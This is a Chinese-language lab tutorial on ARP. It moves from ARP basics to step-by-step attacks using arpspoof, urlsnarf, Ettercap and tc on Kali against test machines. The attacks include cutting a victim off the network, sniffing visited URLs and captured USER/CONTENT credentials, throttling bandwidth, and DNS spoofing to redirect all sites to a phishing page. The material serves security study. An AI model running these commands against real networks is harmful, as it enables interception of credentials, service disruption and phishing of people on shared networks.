---

## ARP协议
### ARP简介
地址解析协议，即ARP（Address Resolution Protocol），是根据[IP地址](https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80)获取[物理地址](https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129)的一个[TCP/IP协议](https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE)。

##### 原理

ARP协议规定,每台计算机都需要一个ARP表,用来保存IP地址和MAC地址的映射关系 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。
如果ARP表中匹配不到,就会使用广播的方式发送一个ARP请求 ，目标主机收到请求后会使用单播的方式返回一个ARP响应,告知自己的MAC地址 。
拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。
#### 三.ARP 协议的作用
网络中的数据传输所依赖的是MAC地址而不是IP地址，ARP协议负责将IP地址转换为MAC地址。
ARP协议的主要工作就是建立、查询、更新、删除ARP表项。
### 简单命令

1. 查询arp表
```
arp -a
```
![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674125883117-44ef9dc1-75b3-43f8-bcba-fc1ab2f40876.png#averageHue=%231d1919&clientId=u2e8ecff1-4bf0-4&from=paste&id=u966fc897&originHeight=412&originWidth=868&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ue68bb8ef-dd14-49e3-b7c2-bb4a93be530&title=)

1. 删除arp表中的某个ip
```
arp -d 想要删除的ip
```

1. tcp抓某块网卡的所有arp请求
```
tcpdump -i eth0 -nn arp
```

1. tcp抓取指定ip的请求
```
tcpdump -i eth0 -nn arp  and host 指定的ip
```
### ARP工作过程简单演示
在kali上连通centos7.
![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674125883081-1a37519a-313b-4673-a0dd-0fa14e1e6e59.png#averageHue=%23120b0a&clientId=u2e8ecff1-4bf0-4&from=paste&id=ub9b001f1&originHeight=223&originWidth=671&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u08de29b0-77ad-4fc1-9a8a-b2c3e3aa2a3&title=)

1. 查看centos的arp表, 可以看到的确是上方ip回应的mac地址
## ARP断网攻击
最终效果: 在同一个局域网中的靶机上不了网
### 原理

1. 攻击机:向目标主机不断的发送ARP报文，然后将其报文中的**网关Mac地址设置成为攻击机的主机MAC地址**，
2. 目标主机想要访问网络发送数据包时，都会发送到攻击机，然后攻击机只需要做一个丢弃数据包的
命令，就可以断掉目标主机的网络了。

图解原理:
![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674125883446-c475508c-0b7d-4d4f-821b-b2654c6d16ed.png#averageHue=%23f7f6f5&clientId=u2e8ecff1-4bf0-4&from=paste&id=ua4c849a6&originHeight=561&originWidth=1184&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u417a2fcc-c39f-4ddf-b335-72827c2c37c&title=)
终端中的表现:

```
ARP攻击机器 不停的在告诉 网关ip(路由器ip)  目标主机ip 的mac地址是 攻击机的ip对应的mac
ARP攻击机器 不停的在告诉 靶机ip  路由器的ip 的mac地址是 攻击机的ip对应的mac
```

![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674125883133-2ae7270e-aaff-4691-b045-d16c682a1489.png#averageHue=%230d0b09&clientId=u2e8ecff1-4bf0-4&from=paste&id=ud49cd2aa&originHeight=90&originWidth=685&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ufc7a4e83-f2a4-4097-a9af-4a5d2385d89&title=)
## 攻击
### 工具arpspoof
arpspoof介绍:
arpspoof 原理: 攻击者通过毒化受害者ARP缓存，将网关MAC替换为攻击者MAC，然后攻击者可截获受害者发送和收到的数据包，从而获取受害者账户、密码等相关敏感信息。Kali 中可以自动下载, 如果下载不了, 可能需要更换下载源.
更换下载源可参考
[https://blog.51cto.com/u_15936127/6000317](https://blog.51cto.com/u_15936127/6000317)
**使用**:

```
arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
-i：指定网卡
-c:攻击机的IP
-t 目标机器的IP
-r：网关IP
```

说白了同时向**靶机**和**网关**发送假的arp, 从而打扰了正常的数据包的发送.
### 具体流程
注意:作为攻击机的kali的数据包转发是默认关闭的.

1. 查看kali的ip：
```
ip a
```

1. 查看windows的ip：
```
ipconfig /all
```

1. windows ping kali:
```
ping kali的ip
```

1. windows中查看arp表，只查看网关内容
```
arp -a |findstr 网关的ip
```

1. 开始攻击,在kali中输入
```
arpspoof -i eth0 -r  网关ip -t  靶机ip
```

1. 此时windows想要再次ping通其他的网址就不行了, 也就是网页打不开了.

当攻击停止后,kali会自动的告诉靶机和网关正确的ip.
## ARP的url流量分析
效果
可以通过下方的流程看到 对方登录了那些网页的url, 也就是获取了对方点过的url.
1.工具
urlsnarf
arpspoof
一个kali的攻击机, 一个kali的靶机
### 流程

1. kali开启数据包转发(kali的数据包转发默认是关闭的0)
```
echo 1 >> /proc/sys/net/ipv4/ip_forward
```
2.在攻击机上开始攻击
```
arpspoof -i eth0 -r 路由器(网关)的ip -t 目标靶机的ip
```
3.获取靶机
```
urlsnarf -i eth0
```
此时 在靶机上网, 随便打开网址就行
观察攻击机的终端窗口, 就可以看到靶机浏览了那些网页了.

# wireshark
打开kali, 输入:
```
wireshark
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674123543372-4573fd2a-3bf3-4f69-971c-9e50800896c1.png#averageHue=%232d3f5e&clientId=u2e8ecff1-4bf0-4&from=paste&height=489&id=uabba436f&originHeight=550&originWidth=1066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=159109&status=done&style=none&taskId=uc0e2c955-2858-46c6-b381-af56b19b4b3&title=&width=947.5555555555555)
> **右边显示的是网卡,  enth0 使人们常用作上网的网卡, 可以看到有折线的波动, 如果右边的线是平的, 代表不能用**



2. 点击进入: enth0

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674124143786-bd34b770-e479-45a3-acc1-2d0d7ae16f20.png#averageHue=%23455060&clientId=u2e8ecff1-4bf0-4&from=paste&height=386&id=u28292a91&originHeight=434&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48906&status=done&style=none&taskId=u8f3e5e86-0f15-464f-b00f-e68d81de41a&title=&width=268.44444444444446)

3. 打开物理机电脑的浏览器, 搜索:
```
title: 后台管理
```
> 随便登录一个
> 用wireshark进行过滤, 找到 Hyper 里面的 login , 那就是我们对边登录的网站.


> **wireshark 只能找 http的, 无法找到https的**


## WireSahrk 过滤命令讲解

**1.过滤源ip，目的ip**

	在wireshark的过滤规则框Filter中输入过滤条件。
	例如: 
**查找目的地址**为192.168.110.11的包
```
ip.dst==192.168.110.11
```

**查找源地址**为1.1.1.1的包
```
ip.src==1.1.1.1
```

**2.端口过滤**

把**源端口和目的端口**为80的都过滤出来
```
tcp.port==80
```

只**过滤目的端口**为80的
```
tcp.dstport==80
```

只**过滤源端口**为80的包
```
tcp.srcport==80
```

**3.协议过滤**

直接在Filter框中直接输入协议名即可滤
```
http
tcp
ssh
```

**4.http模式过滤**
过滤get包
```
http.request.method=="GET"
```

过滤post包
```
http.request.method=="POST"
```

**5.过滤多种条件**
用and连接，如过滤ip为192.168.110.11并且为http协议的
```
ip.src==192.168.110.11 and http
```



# Ettercap
> 用于寻找铭文的嗅探工具, 也就是说只能用于抓取铭文http协议, 无法抓取https


## 功能介绍


## 界面
![](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674126437944-22a1ee61-9728-4325-a559-c12bc58a1c3d.png#averageHue=%23232c3c&from=url&id=sjIKv&originHeight=381&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**注意: **
**注意上方四个选项, 用了上面的两个, 就不要用下面的两个了.**
**1一定要是 root 权限下, 才能启动**
**2点击上方的 √, 就能开启, 扫描主机了**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674128233031-34c276c0-53dd-4a11-9617-c560e1c5a5a3.png#averageHue=%23243346&clientId=u2e8ecff1-4bf0-4&from=paste&height=281&id=u651e2f0f&originHeight=316&originWidth=906&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75677&status=done&style=none&taskId=u4a0b4c51-ad38-477f-8f21-01edaff1117&title=&width=805.3333333333334)
> 一定注意: 
> 必须点击  放大镜,  否则扫描不到主机


### MITM菜单介绍:
```
ARP poisoning :ARP攻击

DNP poisoning :DNP攻击

ICMP redirect :icmp重定向

Port stealing :端口欺骗

DHCP spoofing :DHCP欺骗

stop MITM :停止攻击

SSL intercept :ssl嗅探
```
## 主机,靶机, 视图,文件,日志, 插件 详细介绍
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674128983707-2a0499db-76f5-4402-90cb-7d713e83f510.png#averageHue=%23252e3e&clientId=u2e8ecff1-4bf0-4&from=paste&height=305&id=ue3a91e6f&originHeight=343&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46811&status=done&style=none&taskId=ud1d296bf-8938-4d94-913d-8085053022b&title=&width=734.2222222222222)

#### **hosts选项**
```
Hosts list：扫描到的主机列表

Enable ipv6 scan：扫描ipv6地址

Scan for hosts：扫描主机列表

load hosts form file：从外部文件载入主机列表

Save hosts to file：保存主机列表到文件
```

#### Target 选项
```
Current targets：正在攻击的列表

Select targets：选择攻击列表

Portocol：攻击协议

Reverse matching：匹配规则

Wipe targets：擦除攻击
```

#### View选项
```
Connections：连接信息

Profiles：IP地址信息

Statistics：统计信息

还有几个不是很常用, 此处省略
```

Filters选项
> 导入和停止写好的文件的.

#### Log
> 主要记录了一些日志, 有些时候打不开.


#### Pluggin
> 就是安装, 启动,卸载插件的



## 示例:
```
ettercap -G
```

# 查看和开启攻击列表
> 选择右上方的三个点,  
> Target-----> Currentarget

> **注意: 防止网关和主机的位置, 否则报错**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674127104350-0489a19d-fad3-4eb2-8b39-2f7970a36b7f.png#averageHue=%2322252e&clientId=u2e8ecff1-4bf0-4&from=paste&height=253&id=u09929ba8&originHeight=285&originWidth=486&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14702&status=done&style=none&taskId=uee7efe88-bcfc-4694-af3a-bd8911b79fa&title=&width=432)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674126960570-801e7827-fd0b-4e21-8c8b-3d2ad25cc3e5.png#averageHue=%2323262f&clientId=u2e8ecff1-4bf0-4&from=paste&height=204&id=u4461c65a&originHeight=230&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12327&status=done&style=none&taskId=u45470f6c-c68f-479d-8c68-a7538408f13&title=&width=684.4444444444445)
> **所谓的 主机,  就是 靶机**


> 当然, 直接点击下方的 Add 也行



此时查看靶机的的arp 
```
arp -a|findstr 192.168.110.1
```

查看 攻击机ip
```
ip -a
```
****先停止 攻击, 再去 停止 扫描**
**如果先停止了 扫描, 那就成了断网攻击**


# 命令行运行Ettercap

## 攻击命令
```
ettercap –i –eth0 –Tq –M arp:remote/被攻击者的ip//网关的ip/ >>b.txt
T：指的是text文本模式
q：指的是安静模式执行这个命令
i：后面跟的是连接局域网的网卡
M：后面跟的是指定使用arp的方式
remote 表示双向攻击
>>：输出文件(追加, 不存在就新建文件)
> : 清空原来的文件内容, 再输入新的内容(不存在就新建we年)


# 示例:
ettercap -T -i eth0  -M arp:remote /192.168.110.1// /192.168.110.11// 
```
> **一定要加 q 这个参数, 并且要保存, 不然, 抓到的包都找不到了.**


## 查看日志
```
tail -f b.txt

停止查看：
CTRL+C


# tail 用法
-f 循环读取
-q 不显示处理信息
-v 显示详细的处理信息
-c<数目> 显示的字节数
-n<行数> 显示文件的尾部 n 行内容
--pid=PID 与-f合用,表示在进程ID,PID死掉之后结束
-q, --quiet, --silent 从不输出给出文件名的首部
-s, --sleep-interval=S 与-f合用,表示在每次反复的间隔休眠S秒
```


## 只查看USER 和CONTENT
```markdown
tail -f b.txt | egrep "USER|CONTENT"

# 注意常用 egrep 过滤多字段, 这样比 只过滤一个字段准确.
```

## 停止攻击
> 直接Ctrl + C 


## 查看
> 直接查看保存的文件就行

例如:
```markdown
# 查看b.txt 下的 USER或者CONTENT
cat b.txt | egrep "USER|CONTENT"

# 查看 b.txt 中的 USER或者CONTENT , 并且新建并保存到 arp.log 中, 并显示行号查看.
cat -n  b.txt | egrep "USER|CONTENT" >arp.log
```




# AR_限制网速
大家没想到吧，ARP还能限制对方网速。当kali欺骗了网关和受害者的时候，受害者访问网络就需要经过kali的网卡，那我们限制kali网卡的速度或者转发的速度就可以限制对方的网速。这里可以使用的工具有tc、iptables、WonderShaper等等，我们以tc为例，tc是通过限制网卡的速度来限制对方的，是一种杀敌一千自损八百的手段。
## TC工具介绍
在Linux中，流量控制都是通过TC这个工具来完成的。通常， 要对网卡进行流量控制的配置，需要进行如下的步骤:

1. 为网卡配置一个队列;
2. 在该队列上建立分类;
3. 根据需要建立子队列和子分类;
4. 为每个分类建立过滤器。

需要注意的是， 在TC 中使用下列的缩写表示相应的网络延迟:
时间的计量单位：
s、sec或者secs 秒
ms、msec或者msecs 毫秒
us、usec、usecs或者一个无单位数字 微秒
> **QDisc(排队规则) [qdɪsk]是queueing discipline [ˈkjuːɪŋ] [ˈdɪsəplɪn] 的简写，它是理解流量控制(traffic control)的基础。无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc(排队规则)把数据包加入队列。然后，内核会尽可能多地从qdisc里面取出数据包，把它们交给网络适配器驱动模块。**



## 示例:
> **准备:**

> 1. 一台kali 攻击机
> 2. 一台 win10 靶机
> 
**注意: 这两台机器一定要能相互ping 通. 否则演示失败**

1. 查看 和开启数据包转发
```markdown
cat /proc/sys/net/ipv4/ip_forward 	        # 值为0表示没开启流量转发，为1表示开启了
echo 1 > /proc/sys/net/ipv4/ip_forward     # 开启流量转发
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674134224837-5baa56dc-eac2-416a-9b92-1fd41af8e571.png#averageHue=%23242732&clientId=u51537e55-7dee-4&from=paste&height=165&id=u94947c9b&originHeight=186&originWidth=573&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22121&status=done&style=none&taskId=u1c989251-a26c-4a47-9f0c-59e271c958b&title=&width=509.3333333333333)

2. 查看靶机原来的mac 地址

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674137975571-91995878-797e-43dd-9698-391976aaab5e.png#averageHue=%23201919&clientId=u01f8c95c-ae52-4&from=paste&height=310&id=xx0MB&originHeight=349&originWidth=1014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46477&status=done&style=none&taskId=u40837003-15f6-4211-bcec-7f431fc9cdd&title=&width=901.3333333333334)3. 开始攻击
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674135457738-d6a8e248-ab23-4399-8d5f-596ab720a9eb.png#averageHue=%23262a37&clientId=u01f8c95c-ae52-4&from=paste&height=141&id=ub54e3913&originHeight=159&originWidth=657&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30650&status=done&style=none&taskId=u09fbd62d-2df6-4357-9657-7e8301bc0aa&title=&width=584)

4. 查看网速
> 随便找个 线上测网速的就行


5. 开启tc 限速
```markdown
tc qdisc add dev eth0 root netem delay 500ms


# qqdisc       排队规则
# dev          设备
# root         以 root 身份执行
# netem delay  设置延时时间

# 如果要更改限速的时间, 输入:
tc qdisc change dev eth0 root netem delay 800ms


# 如果想要取消限速
tc qdisc del dev eth0 root netem delay 800ms

# 查看限速规则
tc qdisc show

```

6. 查看当前靶机网速
> 随便找个 线上测网速的就行


> 以上就是这个流程了.

# 原理
> **其实就是利用arp 攻击, 让靶机和路由器 充当 Client和Server , kali 攻击机 成了路由器的作用, 只不过请求在经过kali 的时候, kali 让特别多的请求排队等候, 等候的时间是攻击者确定的,  从而达到延时, 限速的效果.**



# DNS劫持
> 主要是攻击机伪装成DNS

## 概念
DNS是Domain Name System的缩写, 我们称之域名系统。首先它是远程调用服务，本地默认占用53端口，它本身的实质上一个域名和ip的数据库服务器，他要完成的任务是帮我们把输入的域名转换成ip地址，之后通过ip寻址连接目标服务器。
## 工作过程
当访问一个网站时系统将从DNS缓存中读取该域名所对应的IP地址，当查找不到时就会到系统中查找hosts文件，如果还没有那么才会向DNS服务器请求一个DNS查询，DNS服务器将返回该域名所对应的IP，在你的系统收到解析地址以后将使用该IP地址进行访问，同时将解析缓存到本地的DNS缓存中。

# 常用命令
```markdown
# 查看电脑dns 缓存表
ipconfig /displaydns

# 获取dns 网址
ping 网站                     例如:ping www.baidu.com

# 刷新dns 缓存表
ipconfig /flushdns

```

# 示例
## 开启Apache服务
```markdown
service apache2 start
service apache2 status
```
## 开启Apache 主页
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674140722125-678cdd20-b0d1-4c0f-b053-7b22ad4300d9.png#averageHue=%23b1b9c2&clientId=u01f8c95c-ae52-4&from=paste&height=364&id=u8d652b26&originHeight=409&originWidth=752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90211&status=done&style=none&taskId=u678e728f-dfdc-4e90-9edd-0136305f33e&title=&width=668.4444444444445)
## 进入编辑 ettercap
```markdown
# 进入文件夹
cd /etc/ettercap

# 备份原来的 文件
cp etter.dns etter.dns1

```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674141592386-20fec390-f59d-4795-a72e-cbbb5e6a95b4.png#averageHue=%23242833&clientId=u01f8c95c-ae52-4&from=paste&height=220&id=u79cde7e2&originHeight=247&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27364&status=done&style=none&taskId=ud168b7bf-4f94-4005-b6c7-2863499177f&title=&width=488.8888888888889)

## 配置dns原来的文件
```markdown
vi etter.dns
添加以下内容


*   A   192.168.0.128
www.*.com A 192.168.0.128
*   PTR 192.168.0.128



wq保存
参数
*:代表所有的网站 也可设置某个网站 www.mashibing.com
A:代表钓鱼的ip地址
PTR ：常被用于反向地址解析
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674142062824-e45d122d-991b-4a1f-bb4e-9486966b4408.png#averageHue=%23252833&clientId=u01f8c95c-ae52-4&from=paste&height=380&id=u7e1b24d9&originHeight=427&originWidth=349&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26149&status=done&style=none&taskId=u93aacf99-60c0-4f61-99da-ac69ac2e1ba&title=&width=310.22222222222223)

# Ettercap劫持
```markdown
ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.0.128// /192.168.0.1// >b.txt
 
 
 ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关// 
 -i：网卡
 -T：文本模式
 -q：安静模式
 -M：执行mitm攻击
 -P：plugin 开始该插件
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674142760791-72ab5aed-6eb7-4fc5-87c7-b405a38182ec.png#averageHue=%23272b39&clientId=u01f8c95c-ae52-4&from=paste&height=82&id=u137168f8&originHeight=92&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14575&status=done&style=none&taskId=ud9859e55-b68d-44d6-9f9b-e265e1aacef&title=&width=704.8888888888889)

# 查看
> 此时打开浏览器, 随便打开网址, 都会返回到 Apache这个页面


# 停止攻击
> 直接Ctrl +C 


# 回复配置文件
> 删除原来添加 内容的就行

或者
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1674143183757-4b48b75d-baad-4f6b-a0f1-8c3ae6223d0b.png#averageHue=%23252833&clientId=u01f8c95c-ae52-4&from=paste&height=276&id=uc2ed9524&originHeight=310&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46965&status=done&style=none&taskId=u2b32ff6b-0a99-4e61-9bb8-ac00a93999c&title=&width=547.5555555555555)


# ARP防御
[ARP攻击防御.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/26140423/1674261741966-e568f42d-f0fd-47ee-b8c3-b39700b331ee.pdf)
